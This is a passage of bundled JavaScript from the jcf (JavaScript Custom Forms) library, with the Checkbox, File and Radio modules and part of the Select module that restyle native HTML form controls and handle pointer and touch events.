opacity: 0; filter: alpha(opacity=0);");var i=e("html"),r=e("body");"rtl"!==i.css("direction")&&"rtl"!==r.css("direction")||i.addClass(o.rtlClass),i.on("reset",function(){setTimeout(function(){c.refreshAll()},0)}),o.styleSheetCreated=!0};!function(){var t,n=navigator.pointerEnabled||navigator.msPointerEnabled,o="ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch,a={},i="jcf-";t=n?{pointerover:navigator.pointerEnabled?"pointerover":"MSPointerOver",pointerdown:navigator.pointerEnabled?"pointerdown":"MSPointerDown",pointermove:navigator.pointerEnabled?"pointermove":"MSPointerMove",pointerup:navigator.pointerEnabled?"pointerup":"MSPointerUp"}:{pointerover:"mouseover",pointerdown:"mousedown"+(o?" touchstart":""),pointermove:"mousemove"+(o?" touchmove":""),pointerup:"mouseup"+(o?" touchend":"")},e.each(t,function(t,n){e.each(n.split(" "),function(e,n){a[n]=t})}),e.each(t,function(t,n){n=n.split(" "),e.event.special[i+t]={setup:function(){var t=this;e.each(n,function(e,n){t.addEventListener?t.addEventListener(n,c,!1):t["on"+n]=c})},teardown:function(){var t=this;e.each(n,function(e,n){t.addEventListener?t.removeEventListener(n,c,!1):t["on"+n]=null})}}});var r=null,s=function(e){var t=Math.abs(e.pageX-r.x),n=Math.abs(e.pageY-r.y),o=25;return o>=t&&o>=n?!0:void 0},c=function(t){var n=t||window.event,o=null,c=a[n.type];if(t=e.event.fix(n),t.type=i+c,n.pointerType)switch(n.pointerType){case 2:t.pointerType="touch";break;case 3:t.pointerType="pen";break;case 4:t.pointerType="mouse";break;default:t.pointerType=n.pointerType}else t.pointerType=n.type.substr(0,5);return t.pageX||t.pageY||(o=n.changedTouches?n.changedTouches[0]:n,t.pageX=o.pageX,t.pageY=o.pageY),"touchend"===n.type&&(r={x:t.pageX,y:t.pageY}),"mouse"===t.pointerType&&r&&s(t)?void 0:(e.event.dispatch||e.event.handle).call(this,t)}}(),function(){var t=("onwheel"in document||document.documentMode>=9?"wheel":"mousewheel DOMMouseScroll").split(" "),n="jcf-mousewheel";e.event.special[n]={setup:function(){var n=this;e.each(t,function(e,t){n.addEventListener?n.addEventListener(t,o,!1):n["on"+t]=o})},teardown:function(){var n=this;e.each(t,function(e,t){n.addEventListener?n.removeEventListener(t,o,!1):n["on"+t]=null})}};var o=function(t){var o=t||window.event;if(t=e.event.fix(o),t.type=n,"detail"in o&&(t.deltaY=-o.detail),"wheelDelta"in o&&(t.deltaY=-o.wheelDelta),"wheelDeltaY"in o&&(t.deltaY=-o.wheelDeltaY),"wheelDeltaX"in o&&(t.deltaX=-o.wheelDeltaX),"deltaY"in o&&(t.deltaY=o.deltaY),"deltaX"in o&&(t.deltaX=o.deltaX),t.delta=t.deltaY||t.deltaX,1===o.deltaMode){var a=16;t.delta*=a,t.deltaY*=a,t.deltaX*=a}return(e.event.dispatch||e.event.handle).call(this,t)}}();var s={fireNativeEvent:function(t,n){e(t).each(function(){var e,t=this;t.dispatchEvent?(e=document.createEvent("HTMLEvents"),e.initEvent(n,!0,!0),t.dispatchEvent(e)):document.createEventObject&&(e=document.createEventObject(),e.target=t,t.fireEvent("on"+n,e))})},bindHandlers:function(){var t=this;e.each(t,function(n,o){0===n.indexOf("on")&&e.isFunction(o)&&(t[n]=function(){return o.apply(t,arguments)})})}},c={version:t,modules:{},getOptions:function(){return e.extend({},o)},setOptions:function(t,n){arguments.length>1?this.modules[t]&&e.extend(this.modules[t].prototype.options,n):e.extend(o,t)},addModule:function(t){e.isFunction(t)&&(t=t(e,window));var a=function(t){t.element.data(o.dataKey)||t.element.data(o.dataKey,this),n.push(this),this.options=e.extend({},o,this.options,i(t.element),t),this.bindHandlers(),this.init.apply(this,arguments)},i=function(t){var n=t.data(o.optionsKey),a=t.attr(o.optionsKey);if(n)return n;if(a)try{return e.parseJSON(a)}catch(i){}};a.prototype=t,e.extend(t,s),t.plugins&&e.each(t.plugins,function(t,n){e.extend(n.prototype,s)});var r=a.prototype.destroy;a.prototype.destroy=function(){this.options.element.removeData(this.options.dataKey);for(var e=n.length-1;e>=0;e--)if(n[e]===this){n.splice(e,1);break}r&&r.apply(this,arguments)},this.modules[t.name]=a},getInstance:function(t){return e(t).data(o.dataKey)},replace:function(t,n,a){var i,s=this;return o.styleSheetCreated||r(),e(t).each(function(){var t,r=e(this);i=r.data(o.dataKey),i?i.refresh():(n||e.each(s.modules,function(e,t){return t.prototype.matchElement.call(t.prototype,r)?(n=e,!1):void 0}),n&&(t=e.extend({element:r},a),i=new s.modules[n](t)))}),i},refresh:function(t){e(t).each(function(){var t=e(this).data(o.dataKey);t&&t.refresh()})},destroy:function(t){e(t).each(function(){var t=e(this).data(o.dataKey);t&&t.destroy()})},replaceAll:function(t){var n=this;e.each(this.modules,function(o,a){e(a.prototype.selector,t).each(function(){this.className.indexOf("jcf-ignore")<0&&n.replace(this,o)})})},refreshAll:function(t){if(t)e.each(this.modules,function(n,a){e(a.prototype.selector,t).each(function(){var t=e(this).data(o.dataKey);t&&t.refresh()})});else for(var a=n.length-1;a>=0;a--)n[a].refresh()},destroyAll:function(t){if(t)e.each(this.modules,function(n,a){e(a.prototype.selector,t).each(function(t,n){var a=e(n).data(o.dataKey);a&&a.destroy()})});else for(;n.length;)n[0].destroy()}};return"function"==typeof define&&define.amd&&(window.jcf=c),c});

/*!
 * JavaScript Custom Forms : Checkbox Module
 *
 * Copyright 2014-2015 PSD2HTML - http://psd2html.com/jcf
 * Released under the MIT license (LICENSE.txt)
 *
 * Version: 1.2.3
 */
!function(e){e.addModule(function(e){"use strict";return{name:"Checkbox",selector:'input[type="checkbox"]',options:{wrapNative:!0,checkedClass:"jcf-checked",uncheckedClass:"jcf-unchecked",labelActiveClass:"jcf-label-active",fakeStructure:'<span class="jcf-checkbox"><span></span></span>'},matchElement:function(e){return e.is(":checkbox")},init:function(){this.initStructure(),this.attachEvents(),this.refresh()},initStructure:function(){this.doc=e(document),this.realElement=e(this.options.element),this.fakeElement=e(this.options.fakeStructure).insertAfter(this.realElement),this.labelElement=this.getLabelFor(),this.options.wrapNative?this.realElement.appendTo(this.fakeElement).css({position:"absolute",height:"100%",width:"100%",opacity:0,margin:0}):this.realElement.addClass(this.options.hiddenClass)},attachEvents:function(){this.realElement.on({focus:this.onFocus,click:this.onRealClick}),this.fakeElement.on("click",this.onFakeClick),this.fakeElement.on("jcf-pointerdown",this.onPress)},onRealClick:function(e){var t=this;this.savedEventObject=e,setTimeout(function(){t.refresh()},0)},onFakeClick:function(e){this.options.wrapNative&&this.realElement.is(e.target)||this.realElement.is(":disabled")||(delete this.savedEventObject,this.stateChecked=this.realElement.prop("checked"),this.realElement.prop("checked",!this.stateChecked),this.fireNativeEvent(this.realElement,"click"),this.savedEventObject&&this.savedEventObject.isDefaultPrevented()?this.realElement.prop("checked",this.stateChecked):this.fireNativeEvent(this.realElement,"change"),delete this.savedEventObject)},onFocus:function(){this.pressedFlag&&this.focusedFlag||(this.focusedFlag=!0,this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur))},onBlur:function(){this.pressedFlag||(this.focusedFlag=!1,this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur))},onPress:function(e){this.focusedFlag||"mouse"!==e.pointerType||this.realElement.focus(),this.pressedFlag=!0,this.fakeElement.addClass(this.options.pressedClass),this.doc.on("jcf-pointerup",this.onRelease)},onRelease:function(e){this.focusedFlag&&"mouse"===e.pointerType&&this.realElement.focus(),this.pressedFlag=!1,this.fakeElement.removeClass(this.options.pressedClass),this.doc.off("jcf-pointerup",this.onRelease)},getLabelFor:function(){var t=this.realElement.closest("label"),s=this.realElement.prop("id");return!t.length&&s&&(t=e('label[for="'+s+'"]')),t.length?t:null},refresh:function(){var e=this.realElement.is(":checked"),t=this.realElement.is(":disabled");this.fakeElement.toggleClass(this.options.checkedClass,e).toggleClass(this.options.uncheckedClass,!e).toggleClass(this.options.disabledClass,t),this.labelElement&&this.labelElement.toggleClass(this.options.labelActiveClass,e)},destroy:function(){this.options.wrapNative?this.realElement.insertBefore(this.fakeElement).css({position:"",width:"",height:"",opacity:"",margin:""}):this.realElement.removeClass(this.options.hiddenClass),this.fakeElement.off("jcf-pointerdown",this.onPress),this.fakeElement.remove(),this.doc.off("jcf-pointerup",this.onRelease),this.realElement.off({focus:this.onFocus,click:this.onRealClick})}}})}(jcf);

/*!
 * JavaScript Custom Forms : File Module
 *
 * Copyright 2014-2016 PSD2HTML - http://psd2html.com/jcf
 * Released under the MIT license (LICENSE.txt)
 *
 * Version: 1.2.3
 */

(function(jcf) {

    jcf.addModule(function($) {
        'use strict';

        return {
            name: 'File',
            selector: 'input[type="file"]',
            options: {
                fakeStructure: '<span class="jcf-file"><span class="jcf-fake-input"></span><span class="jcf-upload-button"><span class="jcf-button-content"></span></span></span>',
                buttonText: 'Choose file',
                placeholderText: 'No file chosen',
                realElementClass: 'jcf-real-element',
                extensionPrefixClass: 'jcf-extension-',
                selectedFileBlock: '.jcf-fake-input',
                buttonTextBlock: '.jcf-button-content'
            },
            matchElement: function(element) {
                return element.is('input[type="file"]');
            },
            init: function() {
                this.initStructure();
                this.attachEvents();
                this.refresh();
            },
            initStructure: function() {
                this.doc = $(document);
                this.realElement = $(this.options.element).addClass(this.options.realElementClass);
                this.fakeElement = $(this.options.fakeStructure).insertBefore(this.realElement);
                this.fileNameBlock = this.fakeElement.find(this.options.selectedFileBlock);
                this.buttonTextBlock = this.fakeElement.find(this.options.buttonTextBlock).text(this.options.buttonText);

                this.realElement.appendTo(this.fakeElement).css({
                    position: 'absolute',
                    opacity: 0
                });
            },
            attachEvents: function() {
                this.realElement.on({
                    'jcf-pointerdown': this.onPress,
                    change: this.onChange,
                    focus: this.onFocus
                });
            },
            onChange: function() {
                this.refresh();
            },
            onFocus: function() {
                this.fakeElement.addClass(this.options.focusClass);
                this.realElement.on('blur', this.onBlur);
            },
            onBlur: function() {
                this.fakeElement.removeClass(this.options.focusClass);
                this.realElement.off('blur', this.onBlur);
            },
            onPress: function() {
                this.fakeElement.addClass(this.options.pressedClass);
                this.doc.on('jcf-pointerup', this.onRelease);
            },
            onRelease: function() {
                this.fakeElement.removeClass(this.options.pressedClass);
                this.doc.off('jcf-pointerup', this.onRelease);
            },
            getFileName: function() {
                var resultFileName = '',
                    files = this.realElement.prop('files');

                if (files && files.length) {
                    $.each(files, function(index, file) {
                        resultFileName += (index > 0 ? ', ' : '') + file.name;
                    });
                } else {
                    resultFileName = this.realElement.val().replace(/^[\s\S]*(?:\\|\/)([\s\S^\\\/]*)$/g, '$1');
                }

                return resultFileName;
            },
            getFileExtension: function() {
                var fileName = this.realElement.val();
                return fileName.lastIndexOf('.') < 0 ? '' : fileName.substring(fileName.lastIndexOf('.') + 1).toLowerCase();
            },
            updateExtensionClass: function() {
                var currentExtension = this.getFileExtension(),
                    currentClassList = this.fakeElement.prop('className'),
                    cleanedClassList = currentClassList.replace(new RegExp('(\\s|^)' + this.options.extensionPrefixClass + '[^ ]+','gi'), '');

                this.fakeElement.prop('className', cleanedClassList);
                if (currentExtension) {
                    this.fakeElement.addClass(this.options.extensionPrefixClass + currentExtension);
                }
            },
            refresh: function() {
                var selectedFileName = this.getFileName() || this.options.placeholderText;
                this.fakeElement.toggleClass(this.options.disabledClass, this.realElement.is(':disabled'));
                this.fileNameBlock.text(selectedFileName);
                this.updateExtensionClass();
            },
            destroy: function() {
                // reset styles and restore element position
                this.realElement.insertBefore(this.fakeElement).removeClass(this.options.realElementClass).css({
                    position: '',
                    opacity: ''
                });
                this.fakeElement.remove();

                // remove event handlers
                this.realElement.off({
                    'jcf-pointerdown': this.onPress,
                    change: this.onChange,
                    focus: this.onFocus,
                    blur: this.onBlur
                });
                this.doc.off('jcf-pointerup', this.onRelease);
            }
        };
    });

}(jcf));

/*!
 * JavaScript Custom Forms : Radio Module
 *
 * Copyright 2014-2016 PSD2HTML - http://psd2html.com/jcf
 * Released under the MIT license (LICENSE.txt)
 *
 * Version: 1.2.3
 */

(function(jcf) {

    jcf.addModule(function($) {
        'use strict';

        return {
            name: 'Radio',
            selector: 'input[type="radio"]',
            options: {
                wrapNative: true,
                checkedClass: 'jcf-checked',
                uncheckedClass: 'jcf-unchecked',
                labelActiveClass: 'jcf-label-active',
                fakeStructure: '<span class="jcf-radio"><span></span></span>'
            },
            matchElement: function(element) {
                return element.is(':radio');
            },
            init: function() {
                this.initStructure();
                this.attachEvents();
                this.refresh();
            },
            initStructure: function() {
                // prepare structure
                this.doc = $(document);
                this.realElement = $(this.options.element);
                this.fakeElement = $(this.options.fakeStructure).insertAfter(this.realElement);
                this.labelElement = this.getLabelFor();

                if (this.options.wrapNative) {
                    // wrap native radio inside fake block
                    this.realElement.prependTo(this.fakeElement).css({
                        position: 'absolute',
                        opacity: 0
                    });
                } else {
                    // just hide native radio
                    this.realElement.addClass(this.options.hiddenClass);
                }
            },
            attachEvents: function() {
                // add event handlers
                this.realElement.on({
                    focus: this.onFocus,
                    click: this.onRealClick
                });
                this.fakeElement.on('click', this.onFakeClick);
                this.fakeElement.on('jcf-pointerdown', this.onPress);
            },
            onRealClick: function(e) {
                // redraw current radio and its group (setTimeout handles click that might be prevented)
                var self = this;
                this.savedEventObject = e;
                setTimeout(function() {
                    self.refreshRadioGroup();
                }, 0);
            },
            onFakeClick: function(e) {
                // skip event if clicked on real element inside wrapper
                if (this.options.wrapNative && this.realElement.is(e.target)) {
                    return;
                }

                // toggle checked class
                if (!this.realElement.is(':disabled')) {
                    delete this.savedEventObject;
                    this.currentActiveRadio = this.getCurrentActiveRadio();
                    this.stateChecked = this.realElement.prop('checked');
                    this.realElement.prop('checked', true);
                    this.fireNativeEvent(this.realElement, 'click');
                    if (this.savedEventObject && this.savedEventObject.isDefaultPrevented()) {
                        this.realElement.prop('checked', this.stateChecked);
                        this.currentActiveRadio.prop('checked', true);
                    } else {
                        this.fireNativeEvent(this.realElement, 'change');
                    }
                    delete this.savedEventObject;
                }
            },
            onFocus: function() {
                if (!this.pressedFlag || !this.focusedFlag) {
                    this.focusedFlag = true;
                    this.fakeElement.addClass(this.options.focusClass);
                    this.realElement.on('blur', this.onBlur);
                }
            },
            onBlur: function() {
                if (!this.pressedFlag) {
                    this.focusedFlag = false;
                    this.fakeElement.removeClass(this.options.focusClass);
                    this.realElement.off('blur', this.onBlur);
                }
            },
            onPress: function(e) {
                if (!this.focusedFlag && e.pointerType === 'mouse') {
                    this.realElement.focus();
                }
                this.pressedFlag = true;
                this.fakeElement.addClass(this.options.pressedClass);
                this.doc.on('jcf-pointerup', this.onRelease);
            },
            onRelease: function(e) {
                if (this.focusedFlag && e.pointerType === 'mouse') {
                    this.realElement.focus();
                }
                this.pressedFlag = false;
                this.fakeElement.removeClass(this.options.pressedClass);
                this.doc.off('jcf-pointerup', this.onRelease);
            },
            getCurrentActiveRadio: function() {
                return this.getRadioGroup(this.realElement).filter(':checked');
            },
            getRadioGroup: function(radio) {
                // find radio group for specified radio button
                var name = radio.attr('name'),
                    parentForm = radio.parents('form');

                if (name) {
                    if (parentForm.length) {
                        return parentForm.find('input[name="' + name + '"]');
                    } else {
                        return $('input[name="' + name + '"]:not(form input)');
                    }
                } else {
                    return radio;
                }
            },
            getLabelFor: function() {
                var parentLabel = this.realElement.closest('label'),
                    elementId = this.realElement.prop('id');

                if (!parentLabel.length && elementId) {
                    parentLabel = $('label[for="' + elementId + '"]');
                }
                return parentLabel.length ? parentLabel : null;
            },
            refreshRadioGroup: function() {
                // redraw current radio and its group
                this.getRadioGroup(this.realElement).each(function() {
                    jcf.refresh(this);
                });
            },
            refresh: function() {
                // redraw current radio button
                var isChecked = this.realElement.is(':checked'),
                    isDisabled = this.realElement.is(':disabled');

                this.fakeElement.toggleClass(this.options.checkedClass, isChecked)
                    .toggleClass(this.options.uncheckedClass, !isChecked)
                    .toggleClass(this.options.disabledClass, isDisabled);

                if (this.labelElement) {
                    this.labelElement.toggleClass(this.options.labelActiveClass, isChecked);
                }
            },
            destroy: function() {
                // restore structure
                if (this.options.wrapNative) {
                    this.realElement.insertBefore(this.fakeElement).css({
                        position: '',
                        width: '',
                        height: '',
                        opacity: '',
                        margin: ''
                    });
                } else {
                    this.realElement.removeClass(this.options.hiddenClass);
                }

                // removing element will also remove its event handlers
                this.fakeElement.off('jcf-pointerdown', this.onPress);
                this.fakeElement.remove();

                // remove other event handlers
                this.doc.off('jcf-pointerup', this.onRelease);
                this.realElement.off({
                    blur: this.onBlur,
                    focus: this.onFocus,
                    click: this.onRealClick
                });
            }
        };
    });

}(jcf));

/*!
 * JavaScript Custom Forms : Select Module
 *
 * Copyright 2014-2015 PSD2HTML - http://psd2html.com/jcf
 * Released under the MIT license (LICENSE.txt)
 *
 * Version: 1.2.3
 */
!function(e){e.addModule(function(t,s){"use strict";function i(e){this.options=t.extend({wrapNative:!0,wrapNativeOnMobile:!0,fakeDropInBody:!0,useCustomScroll:!0,flipDropToFit:!0,maxVisibleItems:10,fakeAreaStructure:'<span class="jcf-select"><span class="jcf-select-text"></span><span class="jcf-select-opener"></span></span>',fakeDropStructure:'<div class="jcf-select-drop"><div class="jcf-select-drop-content"></div></div>',optionClassPrefix:"jcf-option-",selectClassPrefix:"jcf-select-",dropContentSelector:".jcf-select-drop-content",selectTextSelector:".jcf-select-text",dropActiveClass:"jcf-drop-active",flipDropClass:"jcf-drop-flipped"},e),this.init()}function o(e){this.options=t.extend({wrapNative:!0,useCustomScroll:!0,fakeStructure:'<span class="jcf-list-box"><span class="jcf-list-wrapper"></span></span>',selectClassPrefix:"jcf-select-",listHolder:".jcf-list-wrapper"},e),this.init()}function n(e){this.options=t.extend({holder:null,maxVisibleItems:10,selectOnClick:!0,useHoverClass:!1,useCustomScroll:!1,handleResize:!0,multipleSelectWithoutKey:!1,alwaysPreventMouseWheel:!1,indexAttribute:"data-index",cloneClassPrefix:"jcf-option-",containerStructure:'<span class="jcf-list"><span class="jcf-list-content"></span></span>',containerSelector:".jcf-list-content",captionClass:"jcf-optgroup-caption",disabledClass:"jcf-disabled",optionClass:"jcf-option",groupClass:"jcf-optgroup",hoverClass:"jcf-hover",selectedClass:"jcf-selected",scrollClass:"jcf-scroll-active"},e),this.init()}var l={name:"Select",selector:"select",options:{element:null,multipleCompactStyle:!1},plugins:{ListBox:o,ComboBox:i,SelectList:n},matchElement:function(e){return e.is("select")},init:function(){this.element=t(this.options.element),this.createInstance()},isListBox:function(){return this.element.is("[size]:not([jcf-size]), [multiple]")},createInstance:function(){this.instance&&this.instance.destroy(),this.isListBox()&&!this.options.multipleCompactStyle?this.instance=new o(this.options):this.instance=new i(this.options)},refresh:function(){var e=this.isListBox()&&this.instance instanceof i||!this.isListBox()&&this.instance instanceof o;e?this.createInstance():this.instance.refresh()},destroy:function(){this.instance.destroy()}};t.extend(i.prototype,{init:function(){this.initStructure(),this.bindHandlers(),this.attachEvents(),this.refresh()},initStructure:function(){this.win=t(s),this.doc=t(document),this.realElement=t(this.options.element),this.fakeElement=t(this.options.fakeAreaStructure).insertAfter(this.realElement),this.selectTextContainer=this.fakeElement.find(this.options.selectTextSelector),this.selectText=t("<span></span>").appendTo(this.selectTextContainer),h(this.fakeElement),this.fakeElement.addClass(r(this.realElement.prop("className"),this.options.selectClassPrefix)),this.realElement.prop("multiple")&&this.fakeElement.addClass("jcf-compact-multiple"),this.options.isMobileDevice&&this.options.wrapNativeOnMobile&&!this.options.wrapNative&&(this.options.wrapNative=!0),this.options.wrapNative?this.realElement.prependTo(this.fakeElement).css({position:"absolute",height:"100%",width:"100%"}).addClass(this.options.resetAppearanceClass):(this.realElement.addClass(this.options.hiddenClass),this.fakeElement.attr("title",this.realElement.attr("title")),this.fakeDropTarget=this.options.fakeDropInBody?t("body"):this.fakeElement)},attachEvents:function(){var e=this;this.delayedRefresh=function(){setTimeout(function(){e.refresh(),e.list&&(e.list.refresh(),e.list.scrollToActiveOption())},1)},this.options.wrapNative?this.realElement.on({focus:this.onFocus,change:this.onChange,click:this.onChange,keydown:this.delayedRefresh}):(this.realElement.on({focus:this.onFocus,change:this.onChange,keydown:this.onKeyDown}),this.fakeElement.on({"jcf-pointerdown":this.onSelectAreaPress}))},onKeyDown:function(e){13===e.which?this.toggleDropdown():this.dropActive&&this.delayedRefresh()},onChange:function(){this.refresh()},onFocus:function(){this.pressedFlag&&this.focusedFlag||(this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur),this.toggleListMode(!0),this.focusedFlag=!0)},onBlur:function(){this.pressedFlag||(this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur),this.toggleListMode(!1),this.focusedFlag=!1)},onResize:function(){this.dropActive&&this.hideDropdown()},onSelectDropPress:function(){this.pressedFlag=!0},onSelectDropRelease:function(e,t){this.pressedFlag=!1,"mouse"===t.pointerType&&this.realElement.focus()},onSelectAreaPress:function(e){var s=!this.options.fakeDropInBody&&t(e.target).closest(this.dropdown).length;s||e.button>1||this.realElement.is(":disabled")||(this.selectOpenedByEvent=e.pointerType,this.toggleDropdown(),this.focusedFlag||("mouse"===e.pointerType?this.realElement.focus():this.onFocus(e)),this.pressedFlag=!0,this.fakeElement.addClass(this.options.pressedClass),this.doc.on("jcf-pointerup",this.onSelectAreaRelease))},onSelectAreaRelease:function(e){this.focusedFlag&&"mouse"===e.pointerType&&this.realElement.focus(),this.pressedFlag=!1,this.fakeElement.removeClass(this.options.pressedClass),this.doc.off("jcf-pointerup",this.onSelectAreaRelease)},onOutsideClick:function(e){var s=t(e.target),i=s.closest(this.fakeElement).length||s.closest(this.dropdown).length;i||this.hideDropdown()},onSelect:function(){this.refresh(),this.realElement.prop("multiple")?this.repositionDropdown():this.hideDropdown(),this.fireNativeEvent(this.realElement,"change")},toggleListMode:function(e){this.options.wrapNative||(e?this.realElement.attr({size:4,"jcf-size":""}):this.options.wrapNative||this.realElement.removeAttr("size jcf-size"))},createDropdown:function(){this.dropdown&&(this.list.destroy(),this.dropdown.remove()),this.dropdown=t(this.options.fakeDropStructure).appendTo(this.fakeDropTarget),this.dropdown.addClass(r(this.realElement.prop("className"),this.options.selectClassPrefix)),h(this.dropdown),this.realElement.prop("multiple")&&this.dropdown.addClass("jcf-compact-multiple"),this.options.fakeDropInBody&&this.dropdown.css({position:"absolute",top:-9999}),this.list=new n({useHoverClass:!0,handleResize:!1,alwaysPreventMouseWheel:!0,maxVisibleItems:this.options.maxVisibleItems,useCustomScroll:this.options.useCustomScroll,holder:this.dropdown.find(this.options.dropContentSelector),multipleSelectWithoutKey:this.realElement.prop("multiple"),element:this.realElement}),t(this.list).on({select:this.onSelect,press:this.onSelectDropPress,release:this.onSelectDropRelease})},repositionDropdown:function(){var e,t,s,i=this.fakeElement.offset(),o=this.fakeElement[0].getBoundingClientRect(),n=o.width||o.right-o.left,l=this.fakeElement.outerHeight(),r=this.dropdown.css("width",n).outerHeight(),h=this.win.scrollTop(),a=this.win.height(),c=!1;i.top+l+r>h+a&&i.top-r>h&&(c=!0),this.options.fakeDropInBody&&(s="static"!==this.fakeDropTarget.css("position")?this.fakeDropTarget.offset().top:0,this.options.flipDropToFit&&c?(t=i.left,e=i.top-r-s):(t=i.left,e=i.top+l-s),this.dropdown.css({width:n,left:t,top:e})),this.dropdown.add(this.fakeElement).toggleClass(this.options.flipDropClass,this.options.flipDropToFit&&c)},showDropdown:function(){this.realElement.prop("options").length&&(this.dropdown||this.createDropdown(),this.dropActive=!0,this.dropdown.appendTo(this.fakeDropTarget),this.fakeElement.addClass(this.options.dropActiveClass),this.refreshSelectedText(),this.repositionDropdown(),this.list.setScrollTop(this.savedScrollTop),this.list.refresh(),this.win.on("resize",this.onResize),this.doc.on("jcf-pointerdown",this.onOutsideClick))},hideDropdown:function(){this.dropdown&&(this.savedScrollTop=this.list.getScrollTop(),this.fakeElement.removeClass(this.options.dropActiveClass+" "+this.options.flipDropClass),this.dropdown.removeClass(this.options.flipDropClass).detach(),this.doc.off("jcf-pointerdown",this.onOutsideClick),this.win.off("resize",this.onResize),this.dropActive=!1,"touch"===this.selectOpenedByEvent&&this.onBlur())},toggleDropdown:function(){this.dropActive?this.hideDropdown():this.showDropdown()},refreshSelectedText:function(){var e,s=this.realElement.prop("selectedIndex"),i=this.realElement.prop("options")[s],o=i?i.getAttribute("data-image"):null,n="",l=this;this.realElement.prop("multiple")?(t.each(this.realElement.prop("options"),function(e,t){t.selected&&(n+=(n?", ":"")+t.innerHTML)}),n||(n=l.realElement.attr("placeholder")||""),this.selectText.removeAttr("class").html(n)):i?this.currentSelectedText===i.innerHTML&&this.currentSelectedImage===o||(e=r(i.className,this.options.optionClassPrefix),this.selectText.attr("class",e).html(i.innerHTML),o?(this.selectImage||(this.selectImage=t("<img>").prependTo(this.selectTextContainer).hide()),this.selectImage.attr("src",o).show()):this.selectImage&&this.selectImage.hide(),this.currentSelectedText=i.innerHTML,this.currentSelectedImage=o):(this.selectImage&&this.selectImage.hide(),this.selectText.removeAttr("class").empty())},refresh:function(){"none"===this.realElement.prop("style").display?this.fakeElement.hide():this.fakeElement.show(),this.refreshSelectedText(),this.fakeElement.toggleClass(this.options.disabledClass,this.realElement.is(":disabled"))},destroy:function(){this.options.wrapNative?this.realElement.insertBefore(this.fakeElement).css({position:"",height:"",width:""}).removeClass(this.options.resetAppearanceClass):(this.realElement.removeClass(this.options.hiddenClass),this.realElement.is("[jcf-size]")&&this.realElement.removeAttr("size jcf-size")),this.fakeElement.remove(),this.doc.off("jcf-pointerup",this.onSelectAreaRelease),this.realElement.off({focus:this.onFocus})}}),t.extend(o.prototype,{init:function(){this.bindHandlers(),this.initStructure(),this.attachEvents()},initStructure:function(){this.realElement=t(this.options.element),this.fakeElement=t(this.options.fakeStructure).insertAfter(this.realElement),this.listHolder=this.fakeElement.find(this.options.listHolder),h(this.fakeElement),this.fakeElement.addClass(r(this.realElement.prop("className"),this.options.selectClassPrefix)),this.realElement.addClass(this.options.hiddenClass),this.list=new n({useCustomScroll:this.options.useCustomScroll,holder:this.listHolder,selectOnClick:!1,element:this.realElement})},attachEvents:function(){var e=this;this.delayedRefresh=function(t){t&&(16===t.which||t.ctrlKey||t.metaKey||t.altKey)||(clearTimeout(e.refreshTimer),e.refreshTimer=setTimeout(function(){e.refresh(),e.list.scrollToActiveOption()},1))},this.realElement.on({focus:this.onFocus,click:this.delayedRefresh,keydown:this.delayedRefresh}),t(this.list).on({select:this.onSelect,press:this.onFakeOptionsPress,release:this.onFakeOptionsRelease})},onFakeOptionsPress:function(e,t){this.pressedFlag=!0,"mouse"===t.pointerType&&this.realElement.focus()},onFakeOptionsRelease:function(e,t){this.pressedFlag=!1,"mouse"===t.pointerType&&this.realElement.focus()},onSelect:function(){this.fireNativeEvent(this.realElement,"change"),this.fireNativeEvent(this.realElement,"click")},onFocus:function(){this.pressedFlag&&this.focusedFlag||(this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur),this.focusedFlag=!0)},onBlur:function(){this.pressedFlag||(this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur),this.focusedFlag=!1)},refresh:function(){this.fakeElement.toggleClass(this.options.disabledClass,this.realElement.is(":disabled")),this.list.refresh()},destroy:function(){this.list.destroy(),this.realElement.insertBefore(this.fakeElement).removeClass(this.options.hiddenClass),this.fakeElement.remove()}}),t.extend(n.prototype,{init:function(){this.initStructure(),this.refreshSelectedClass(),this.attachEvents()},initStructure:function(){this.element=t(this.options.element),this.indexSelector="["+this.options.indexAttribute+"]",this.container=t(this.options.containerStructure).appendTo(this.options.holder),this.listHolder=this.container.find(this.options.containerSelector),this.lastClickedIndex=this.element.prop("selectedIndex"),this.rebuildList(),this.element.prop("multiple")&&(this.previousSelection=this.getSelectedOptionsIndexes())},attachEvents:function(){this.bindHandlers(),this.listHolder.on("jcf-pointerdown",this.indexSelector,this.onItemPress),this.listHolder.on("jcf-pointerdown",this.onPress),this.options.useHoverClass&&this.listHolder.on("jcf-pointerover",this.indexSelector,this.onHoverItem)},onPress:function(e){t(this).trigger("press",e),this.listHolder.on("jcf-pointerup",this.onRelease)},onRelease:function(e){t(this).trigger("release",e),this.listHolder.off("jcf-pointerup",this.onRelease)},onHoverItem:function(e){var t=parseFloat(e.currentTarget.getAttribute(this.options.indexAttribute));this.fakeOptions.removeClass(this.options.hoverClass).eq(t).addClass(this.options.hoverClass)},onItemPress:function(e){"touch"===e.pointerType||this.options.selectOnClick?(this.tmpListOffsetTop=this.list.offset().top,this.listHolder.on("jcf-pointerup",this.indexSelector,this.onItemRelease)):this.onSelectItem(e)},onItemRelease:function(e){this.listHolder.off("jcf-pointerup",this.indexSelector,this.onItemRelease),this.tmpListOffsetTop===this.list.offset().top&&this.listHolder.on("click",this.indexSelector,{savedPointerType:e.pointerType},this.onSelectItem),delete this.tmpListOffsetTop},onSelectItem:function(e){var s,i=parseFloat(e.currentTarget.getAttribute(this.options.indexAttribute)),o=e.data&&e.data.savedPointerType||e.pointerType||"mouse";this.listHolder.off("click",this.indexSelector,this.onSelectItem),e.button>1||this.realOptions[i].disabled||(this.element.prop("multiple")?e.metaKey||e.ctrlKey||"touch"===o||this.options.multipleSelectWithoutKey?this.realOptions[i].selected=!this.realOptions[i].selected:e.shiftKey?(s=[this.lastClickedIndex,i].sort(function(e,t){return e-t}),this.realOptions.each(function(e,t){t.selected=e>=s[0]&&e<=s[1]})):this.element.prop("selectedIndex",i):this.element.prop("selectedIndex",i),e.shiftKey||(this.lastClickedIndex=i),this.refreshSelectedClass(),"mouse"===o&&this.scrollToActiveOption(),t(this).trigger("select"))},rebuildList:function(){var 